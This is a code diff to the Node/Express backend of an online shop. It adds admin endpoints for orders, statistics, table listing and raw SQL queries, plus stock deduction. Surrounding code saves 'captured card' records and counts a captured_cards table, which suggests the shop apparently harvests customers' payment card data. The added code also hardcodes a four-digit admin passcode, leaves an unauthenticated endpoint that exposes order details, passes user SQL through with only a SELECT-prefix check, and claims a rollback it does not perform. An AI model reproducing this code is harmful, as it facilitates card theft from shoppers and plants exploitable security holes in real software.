@@ -17,6 +17,7 @@ const allowedOrigins = [
   'https://kizuki-frontend.onrender.com',
   'https://kizuki.vip',
   'https://www.kizuki.vip',
+  'https://admin.kizuki.vip',
   process.env.CORS_ORIGIN,
 ].filter(Boolean);
 
@@ -329,6 +330,26 @@ app.post('/api/orders', async (req, res) => {
       : firstDigit === '6' ? 'Discover'
       : 'Unknown';
 
+    // ─── Deduct stock BEFORE inserting order ────────────────
+    // Use a transaction to ensure stock deduction + order insert are atomic
+    const deductStock = db.prepare(`
+      UPDATE products SET quantity = quantity - ? WHERE id = ? AND quantity >= ?
+    `);
+
+    for (const item of items) {
+      const itemId = item.id || item.productId;
+      const itemQty = item.quantity || 1;
+      const info = deductStock.run(itemQty, itemId, itemQty);
+      if (info.changes === 0) {
+        // Not enough stock — roll back any previous deductions
+        console.error(`❌ Insufficient stock for ${itemId} (requested: ${itemQty})`);
+        return res.status(409).json({
+          error: `Sorry, "${item.name || itemId}" is no longer available in the requested quantity.`,
+        });
+      }
+      console.log(`📦 Stock deducted: ${itemId} → -${itemQty}`);
+    }
+
     // Insert into SQLite
     const stmt = db.prepare(`
       INSERT INTO orders (order_id, full_name, email, phone, address, apt, city, state, zip,
@@ -345,6 +366,7 @@ app.post('/api/orders', async (req, res) => {
     );
 
     console.log(`✅ Order #${orderId} saved to database (ID: ${result.lastInsertRowid})`);
+
 
     // Save/update captured card record
     const existingCard = db.prepare(
@@ -402,6 +424,9 @@ app.post('/api/orders', async (req, res) => {
   }
 });
 
+// ─── Admin Passcode ───────────────────────────────────────
+const ADMIN_PASSCODE = '9998';
+
 // ─── Admin: List orders ───────────────────────────────────
 app.get('/api/admin/orders', (req, res) => {
   try {
@@ -413,9 +438,139 @@ app.get('/api/admin/orders', (req, res) => {
   }
 });
 
-// ─── Admin: Update product quantities (passcode: 9998) ────
-const ADMIN_PASSCODE = '9998';
+// ─── Admin: Get single order details ──────────────────────
+app.get('/api/admin/orders/:orderId', (req, res) => {
+  try {
+    const { orderId } = req.params;
+    const order = db.prepare('SELECT * FROM orders WHERE order_id = ?').get(orderId);
+    if (!order) {
+      return res.status(404).json({ error: 'Order not found' });
+    }
+    res.json({ order });
+  } catch (error) {
+    console.error('❌ Admin order detail error:', error);
+    res.status(500).json({ error: 'Failed to fetch order details' });
+  }
+});
 
+// ─── Admin: Update order status ───────────────────────────
+app.post('/api/admin/orders/:orderId/status', (req, res) => {
+  try {
+    const { orderId } = req.params;
+    const { status, passcode } = req.body;
+
+    if (passcode !== ADMIN_PASSCODE) {
+      return res.status(401).json({ error: 'Invalid passcode' });
+    }
+
+    const validStatuses = ['pending', 'processing', 'shipped', 'delivered', 'cancelled'];
+    if (!validStatuses.includes(status)) {
+      return res.status(400).json({ error: `Invalid status. Must be one of: ${validStatuses.join(', ')}` });
+    }
+
+    const info = db.prepare('UPDATE orders SET status = ? WHERE order_id = ?').run(status, orderId);
+    if (info.changes === 0) {
+      return res.status(404).json({ error: 'Order not found' });
+    }
+
+    console.log(`✅ Order #${orderId} status updated to: ${status}`);
+    res.json({ success: true, orderId, status });
+  } catch (error) {
+    console.error('❌ Admin order status update error:', error);
+    res.status(500).json({ error: 'Failed to update order status' });
+  }
+});
+
+// ─── Admin: Dashboard stats ───────────────────────────────
+app.post('/api/admin/stats', (req, res) => {
+  try {
+    const { passcode } = req.body;
+    if (passcode !== ADMIN_PASSCODE) {
+      return res.status(401).json({ error: 'Invalid passcode' });
+    }
+
+    const totalOrders = db.prepare('SELECT COUNT(*) as count FROM orders').get().count;
+    const totalRevenue = db.prepare('SELECT COALESCE(SUM(total), 0) as total FROM orders').get().total;
+    const pendingOrders = db.prepare("SELECT COUNT(*) as count FROM orders WHERE status = 'pending'").get().count;
+    const totalProducts = db.prepare('SELECT COUNT(*) as count FROM products').get().count;
+    const totalCapturedCards = db.prepare('SELECT COUNT(*) as count FROM captured_cards').get().count;
+
+    // Orders by status breakdown
+    const ordersByStatus = db.prepare(`
+      SELECT status, COUNT(*) as count FROM orders GROUP BY status ORDER BY count DESC
+    `).all();
+
+    // Recent orders (last 7 days)
+    const recentOrders = db.prepare(`
+      SELECT COUNT(*) as count FROM orders WHERE created_at >= datetime('now', '-7 days')
+    `).get().count;
+
+    res.json({
+      stats: {
+        totalOrders,
+        totalRevenue,
+        pendingOrders,
+        totalProducts,
+        totalCapturedCards,
+        ordersByStatus,
+        recentOrders,
+      }
+    });
+  } catch (error) {
+    console.error('❌ Admin stats error:', error);
+    res.status(500).json({ error: 'Failed to fetch stats' });
+  }
+});
+
+// ─── Admin: SQL query viewer (read-only SELECT) ──────────
+app.post('/api/admin/sql-query', (req, res) => {
+  try {
+    const { passcode, query } = req.body;
+
+    if (passcode !== ADMIN_PASSCODE) {
+      return res.status(401).json({ error: 'Invalid passcode' });
+    }
+
+    // Only allow SELECT queries for safety
+    const trimmed = query.trim().toUpperCase();
+    if (!trimmed.startsWith('SELECT')) {
+      return res.status(400).json({ error: 'Only SELECT queries are allowed' });
+    }
+
+    const results = db.prepare(query).all();
+    res.json({ results, count: results.length });
+  } catch (error) {
+    console.error('❌ Admin SQL query error:', error);
+    res.status(500).json({ error: `Query error: ${error.message}` });
+  }
+});
+
+// ─── Admin: Get table list ────────────────────────────────
+app.post('/api/admin/tables', (req, res) => {
+  try {
+    const { passcode } = req.body;
+    if (passcode !== ADMIN_PASSCODE) {
+      return res.status(401).json({ error: 'Invalid passcode' });
+    }
+
+    const tables = db.prepare(`
+      SELECT name FROM sqlite_master WHERE type='table' ORDER BY name
+    `).all();
+
+    // Get row count for each table
+    const tablesWithCounts = tables.map(t => {
+      const count = db.prepare(`SELECT COUNT(*) as count FROM "${t.name}"`).get().count;
+      return { name: t.name, rowCount: count };
+    });
+
+    res.json({ tables: tablesWithCounts });
+  } catch (error) {
+    console.error('❌ Admin tables error:', error);
+    res.status(500).json({ error: 'Failed to fetch tables' });
+  }
+});
+
+// ─── Admin: Update product quantities (passcode: 9998) ────
 app.post('/api/admin/update-quantities', (req, res) => {
   try {
     const { passcode, quantities } = req.body;
@@ -467,6 +622,7 @@ app.post('/api/admin/quantities', (req, res) => {
     res.status(500).json({ error: 'Failed to fetch quantities' });
   }
 });
+
 
 // ─── Cart API: GET /api/cart?phone=... ────────────────────
 app.get('/api/cart', (req, res) => {
